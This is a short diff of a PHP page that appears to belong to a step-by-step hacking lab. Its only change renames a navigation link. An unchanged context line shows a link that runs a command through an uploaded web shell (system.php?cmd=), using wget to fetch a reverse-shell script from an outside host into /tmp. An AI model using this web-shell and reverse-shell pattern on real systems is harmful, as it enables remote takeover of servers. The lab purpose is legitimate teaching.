@@ -39,7 +39,7 @@
     		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
             </div>
             <nav>
-                <a href="login3.php">Goto step 3</a>
+                <a href="step3.php">Goto step 3</a>
             </nav>
         </div>
 
